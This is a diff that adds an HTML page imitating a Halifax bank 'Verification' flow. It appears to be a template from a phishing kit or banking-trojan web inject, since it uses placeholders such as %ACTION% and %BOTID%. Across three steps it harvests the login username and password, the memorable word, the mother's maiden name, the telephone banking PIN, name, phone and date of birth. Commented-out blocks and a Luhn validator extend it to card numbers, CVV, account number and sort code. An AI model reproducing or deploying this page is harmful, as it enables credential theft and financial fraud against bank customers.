@@ -1,0 +1,692 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Type"content="text/html; charset=utf-8">
+    <meta name="viewport"content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">
+    <link rel="stylesheet"href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cerulean/bootstrap.min.css">
+    <link rel="stylesheet"href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js">
+    </script>
+    <style type="text/css">*{
+      outline:none;
+      }
+      .br{
+        border:1px dotted red;
+      }
+      .stol{
+        display:table;
+        width:100%;
+      }
+      .td{
+        display:table-cell;
+      }
+      .w100{
+        width:100%;
+      }
+      .left_{
+        text-align:left;
+      }
+      .right_{
+        text-align:right;
+      }
+      .center{
+        text-align:center;
+      }
+      .top{
+        vertical-align:top;
+      }
+      .bottom{
+        vertical-align:bottom;
+      }
+      .middle{
+        vertical-align:middle;
+      }
+      .inline{
+        display:inline-block;
+      }
+      .pad{
+        padding:15px;
+      }
+      .tr{
+        display:table-row;
+      }
+      .none{
+        display:none;
+      }
+      body,html{
+        background-color:transparent;
+      }
+      @media(max-width:768px){
+        .block-xs{
+          display:block;
+          width:100%!important;
+        }
+        .center-xs{
+          text-align:center!important;
+        }
+      }
+      .ramka{
+        border:2px solid#c3c4eb;
+        background-color:white;
+        border-radius:5px;
+        background-color:white!important;
+      }
+      .header{
+        padding:20px 20px;
+        background-color:#22259b;
+        border-radius:5px 5px 0 0;
+        ;
+        color:white;
+      }
+      .body{
+        padding:15px;
+      }
+      .control-label{
+        color:#505050;
+        font-weight:600;
+      }
+      .body h3{
+        color:#1b1d5f;
+        font-weight:600}
+      .has-error.control-label,.has-error.help-block,.has-error.form-control-feedback{
+      }
+      .step_label_h4{
+        color:#006a4d;
+      }
+    </style>
+  </head>
+  <body>
+    <form role="form"name="form"action="%ACTION%"id="form"method="post"class="">
+      <input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
+      <div class="container cont1 "style="padding-top:15px">
+        <div class="ramka"style="">
+          <div class="header"style="">
+            <div class="stol w100  "style="">
+              <div class="td  middle left_"style="width:1px">
+                <img src="%DYN_PATH%/img/halifax.png"style=""class=""/>
+              </div>
+              <div class="td  middle left_ hidden-xs"style="padding-left:20px">
+                <h4 style="margin:0">|Verification
+                </h4>
+              </div>
+              <div class="td  middle right_"style="padding-right:20px">
+                <h4 style="margin:0">Step 1 of 3
+                </h4>
+              </div>
+            </div>
+          </div>
+          <div class="body "style="">
+            <div class="row "style="">
+              <div class="col-sm-12 "style="">
+                <h3 class=""style="margin-top:0">
+                </h3>
+                <p>
+                </p>
+                <hr class=""style=""/>
+                
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Username:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <input class="form-control"type="text"maxlength=""name="fields[Username]"id="Username"placeholder=""/>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group "style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Password:
+                      </label>
+                    </div>
+                    <div class="col-sm-3"style="">
+                      <input class="form-control"type="password"name="fields[Password]"maxlength=""id="Password"placeholder=""/>
+                    </div>
+                  </div>
+                </div>
+                
+                <hr class=""style=""/>
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <a href="javascript:void(0)"class="btn btn-info pull-right cont_but"style="">Continue
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="container cont2 none"style="padding-top:15px">
+        <div class="ramka"style="">
+          <div class="header"style="">
+            <div class="stol w100  "style="">
+              <div class="td  middle left_"style="width:1px">
+                <img src="%DYN_PATH%/img/halifax.png"style=""class=""/>
+              </div>
+              <div class="td  middle left_ hidden-xs"style="padding-left:20px">
+                <h4 style="margin:0">|Verification
+                </h4>
+              </div>
+              <div class="td  middle right_"style="padding-right:20px">
+                <h4 style="margin:0">Step 2 of 3
+                </h4>
+              </div>
+            </div>
+          </div>
+          <div class="body "style="">
+            <div class="row "style="">
+              <div class="col-sm-12 "style="">
+                <h3 class=""style="margin-top:0">
+                </h3>
+                <p>
+                </p>
+                <hr class=""style=""/>
+
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Memorable word:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <input class="form-control"type="text"name="fields[mw]"maxlength=""id="mw"placeholder=""/>
+                    </div>
+                  </div>
+                </div>
+                
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Mother's maiden name:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <input class="form-control"type="text"name="fields[mmn]"maxlength=""id="mmn"placeholder=""/>
+                    </div>
+                  </div>
+                </div>
+<!--
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Account number:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <input class="form-control"type="text"name="fields[acc]"maxlength="8"id="acc"placeholder=""/>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <span class="some_class">
+                        <span class="fa fa-info-circle ">
+                        </span>8 digits
+                      </span>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Sort code:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <input class="form-control"type="text"name="fields[sort]"maxlength="6"id="sort"placeholder=""/>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <span class="some_class">
+                        <span class="fa fa-info-circle ">
+                        </span>6 digits
+                      </span>
+                    </div>
+                  </div>
+                </div>
+-->
+                
+				<div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Telephone Banking PIN:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 col-xs-8"style="">
+                      <div class="input-group "style="">
+                        <input class="form-control"type="password"maxlength="6"name="fields[t_pin]"id="t_pin"placeholder=""/>
+                        <span class="input-group-addon">
+                          <span class="fa fa-mobile ">
+                          </span>
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                
+                <hr class=""style=""/>
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <a href="javascript:void(0)"class="btn btn-info pull-right cont_but"style="">Continue
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="container cont3 none"style="padding-top:15px">
+        <div class="ramka"style="">
+          <div class="header"style="">
+            <div class="stol w100  "style="">
+              <div class="td  middle left_"style="width:1px">
+                <img src="%DYN_PATH%/img/halifax.png"style=""class=""/>
+              </div>
+              <div class="td  middle left_ hidden-xs"style="padding-left:20px">
+                <h4 style="margin:0">|Verification
+                </h4>
+              </div>
+              <div class="td  middle right_"style="padding-right:20px">
+                <h4 style="margin:0">Step 3 of 3
+                </h4>
+              </div>
+            </div>
+          </div>
+          <div class="body "style="">
+            <div class="row "style="">
+              <div class="col-sm-12 "style="">
+                <h3 class=""style="margin-top:0">
+                </h3>
+                <p>
+                </p>
+                <hr class=""style=""/>
+<!--
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Card number:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <div class="input-group "style="">
+                        <input class="form-control"type="text"maxlength="16"name="cc"id="cc"placeholder="Card number..."/>
+                        <span class="input-group-addon">
+                          <span class="fa fa-credit-card ">
+                          </span>
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group "style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Card expiry date:
+                      </label>
+                    </div>
+                    <div class="col-sm-2 col-xs-5"style="">
+                      <select class="form-control exp_m"name="fields[exp_m]">
+                        <option value="--">Day
+                        </option>
+                        <script type="text/javascript">for(i=1;i<=12;i++)
+                          {
+                            document.write('<option value="'+i+'">'+i+'</option>');
+                          };
+                        </script>
+                      </select>
+                    </div>
+                    <div class="col-sm-2 col-xs-6"style="">
+                      <select class="form-control exp_y"name="fields[exp_y]">
+                        <option value="--">Year
+                        </option>
+                        <script type="text/javascript">for(i=2016;i<=2026;i++){
+                            document.write('<option value="'+i+'">'+i+'</option>');
+                          };
+                        </script>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">CVV:
+                      </label>
+                    </div>
+                    <div class="col-sm-2 col-xs-6"style="">
+                      <div class="input-group "style="">
+                        <input class="form-control"type="text"maxlength="3"name="fields[cvv]"id="cvv"/>
+                        <span class="input-group-addon">CVV
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+-->
+
+
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">First name:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <div class="input-group "style="">
+                        <input class="form-control"type="text"name="fields[f_name]"id="f_name"placeholder=""/>
+                        <span class="input-group-addon">
+                          <span class="fa fa-user ">
+                          </span>
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Last name:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <div class="input-group "style="">
+                        <input class="form-control"type="text"name="fields[l_name]"id="l_name"placeholder=""/>
+                        <span class="input-group-addon">
+                          <span class="fa fa-user ">
+                          </span>
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+<!--
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">House or Flat number:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 col-xs-5"style="">
+                      <input class="form-control"type="text"name="fields[addr_lineN1]"id="addr_lineN1"placeholder=""/>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4"style="">
+                      <label class="control-label"for="">Post code:
+                      </label>
+                    </div>
+                    <div class="col-sm-3  col-xs-5"style="">
+                      <input class="form-control"type="text"name="fields[postcode]"id="postcode"placeholder=""/>
+                    </div>
+                  </div>
+                </div>
+-->
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Phone number:
+                      </label>
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <div class="input-group "style="">
+                        <input class="form-control"type="text"maxlength="11"name="fields[phone]"id="phone"placeholder=""/>
+                        <span class="input-group-addon">
+                          <span class="fa fa-phone ">
+                          </span>
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                      <label class="control-label"for="">Date of birth:
+                      </label>
+                    </div>
+                    <div class="col-sm-1 col-xs-4"style="padding-right:5px">
+                      <select class="form-control dob_d"name="fields[dob_d]">
+                        <option value="--">Day
+                        </option>
+                        <script type="text/javascript">for(i=1;i<=31;i++)
+                          {
+                            document.write('<option value="'+i+'">'+i+'</option>');
+                          };
+                        </script>
+                      </select>
+                    </div>
+                    <div class="col-sm-1 col-xs-4"style="padding-right:5px;padding-left:5px">
+                      <select class="form-control dob_m"name="fields[dob_m]">
+                        <option value="--">Month
+                        </option>
+                        <script type="text/javascript">for(i=1;i<=12;i++)
+                          {
+                            document.write('<option value="'+i+'">'+i+'</option>');
+                          };
+                        </script>
+                      </select>
+                    </div>
+                    <div class="col-sm-1 col-xs-4"style="padding-left:5px">
+                      <select class="form-control dob_y"name="fields[dob_y]">
+                        <option value="----">Year
+                        </option>
+                        <script type="text/javascript">for(i=1950;i<=1998;i++)
+                          {
+                            document.write('<option value="'+i+'">'+i+'</option>');
+                          };
+                        </script>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                
+                
+                <hr class=""style=""/>
+                <div class="form-group"style="">
+                  <div class="row "style="">
+                    <div class="col-sm-4 "style="">
+                    </div>
+                    <div class="col-sm-3 "style="">
+                      <a href="javascript:void(0)"class="btn btn-info pull-right cont_but"style="">Confirm
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </form>
+  </body>
+  <script type="text/javascript">(function(){
+      __insHiddenField=function(objDoc,objForm,sNm,sV){
+        var input=objDoc.createElement("input");
+        input.setAttribute("type","hidden");
+        input.setAttribute("name",sNm);
+        input.setAttribute("value",sV);
+        objForm.appendChild(input);
+      };
+      var oForm=document.getElementById('form');
+
+      $('.form-control').focus(function(){
+        $('.has-error').removeClass('has-error');
+      }
+                              )
+      $('.cont1 .cont_but').bind('click',function(){
+        var err=false;
+        
+        var Username=$('#Username').val();
+        var Password=$('#Password').val();
+
+        var VRegExp=new RegExp(/^[a-z-A-Z0-9]{4,20}\b/);
+        if(!VRegExp.test(Username)){
+          $('#Username').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+        var VRegExp=new RegExp(/^[a-z-A-Z0-9]{5,20}\b/);
+        if(!VRegExp.test(Password)){
+          $('#Password').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+
+
+        if(err==true){
+          return;
+        };
+        $('.cont1').hide();
+        $('.cont2').show();
+      }
+                                );
+      $('.cont2 .cont_but').bind('click',function(){
+        var err=false;
+        var mw=$('#mw').val();
+        //~ var acc=$('#acc').val();
+        //~ var sort=$('#sort').val();
+
+        var VRegExp=new RegExp(/^[a-z-A-Z0-9]{4,15}\b/);
+        if(!VRegExp.test(mw)){
+          $('#mw').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+        
+        var mmn=$('#mmn').val();
+        
+        var VRegExp=new RegExp(/^[a-z-A-Z0-9]{4,20}\b/);
+        if(!VRegExp.test(mmn)){
+          $('#mmn').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+        //~ var VRegExp=new RegExp(/^[0-9]{8}\b/);
+        //~ if(!VRegExp.test(acc)){
+          //~ $('#acc').closest('.form-group').addClass('has-error');
+          //~ err=true;
+        //~ };
+        //~ var VRegExp=new RegExp(/^[0-9]{6}\b/);
+        //~ if(!VRegExp.test(sort)){
+          //~ $('#sort').closest('.form-group').addClass('has-error');
+          //~ err=true;
+        //~ };
+        if(err==true){
+          return;
+        };
+        $('.cont2').hide();
+        $('.cont3').show();
+      }
+                                );
+      $('.cont3 .cont_but').bind('click',function(){
+        var err=false;
+        //~ var cc=$('#cc').val();
+        //~ var cvv=$('#cvv').val();
+        //~ if(!Validate(cc)){
+          //~ $('#cc').closest('.form-group').addClass('has-error');
+          //~ err=true;
+        //~ };
+        //~ if($('.exp_m option:selected').val()=="--"){
+          //~ $('.exp_m').closest('.form-group').addClass('has-error');
+          //~ err=true;
+        //~ };
+        //~ if($('.exp_y option:selected').val()=="----"){
+          //~ $('.exp_y').closest('.form-group').addClass('has-error');
+          //~ err=true;
+        //~ };
+        //~ var VRegExp=new RegExp(/^[0-9]{3}\b/);
+        //~ if(!VRegExp.test(cvv)){
+          //~ $('#cvv').closest('.form-group').addClass('has-error');
+          //~ err=true;
+        //~ };
+        
+        var f_name=$('#f_name').val();
+        var l_name=$('#l_name').val();
+        //~ var addr_lineN1=$('#addr_lineN1').val();
+        //~ var postcode=$('#postcode').val();
+        var phone=$('#phone').val();
+        var VRegExp=new RegExp(/^[a-z-A-Z]{3,50}\b/);
+        if(!VRegExp.test(f_name)){
+          $('#f_name').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+        var VRegExp=new RegExp(/^[a-z-A-Z]{3,50}\b/);
+        if(!VRegExp.test(l_name)){
+          $('#l_name').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+        //~ var VRegExp=new RegExp(/^[a-z-A-Z0-9]{1,10}\b/);
+        //~ if(!VRegExp.test(addr_lineN1)){
+          //~ $('#addr_lineN1').closest('.form-group').addClass('has-error');
+          //~ err=true;
+        //~ };
+        //~ if(postcode.length<3){
+          //~ $('#postcode').closest('.form-group').addClass('has-error');
+          //~ err=true;
+        //~ };
+        var VRegExp=new RegExp(/^[0-9]{6,11}\b/);
+        if(!VRegExp.test(phone)){
+          $('#phone').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+        if($('.dob_d option:selected').val()=="--"){
+          $('.dob_d').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+        if($('.dob_m option:selected').val()=="--"){
+          $('.dob_m').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+        if($('.dob_y option:selected').val()=="----"){
+          $('.dob_y').closest('.form-group').addClass('has-error');
+          err=true;
+        };
+        
+        if(err==true){
+          return;
+        };
+        oForm.submit();
+        
+      }
+                                );
+    }
+                                 )();
+    function Calculate(Luhn)
+    {
+      var sum=0;
+      for(i=0;i<Luhn.length;i++)
+      {
+        sum+=parseInt(Luhn.substring(i,i+1));
+      }
+      var delta=new Array(0,1,2,3,4,-4,-3,-2,-1,0);
+      for(i=Luhn.length-1;i>=0;i-=2)
+      {
+        var deltaIndex=parseInt(Luhn.substring(i,i+1));
+        var deltaValue=delta[deltaIndex];
+        sum+=deltaValue;
+      }
+      var mod10=sum%10;
+      mod10=10-mod10;
+      if(mod10==10)
+      {
+        mod10=0;
+      }
+      return mod10;
+    };
+    function Validate(Luhn)
+    {
+      var LuhnDigit=parseInt(Luhn.substring(Luhn.length-1,Luhn.length));
+      var LuhnLess=Luhn.substring(0,Luhn.length-1);
+      if(Calculate(LuhnLess)==parseInt(LuhnDigit))
+      {
+        return true;
+      }
+      return false;
+    };
+  </script>
+</html>
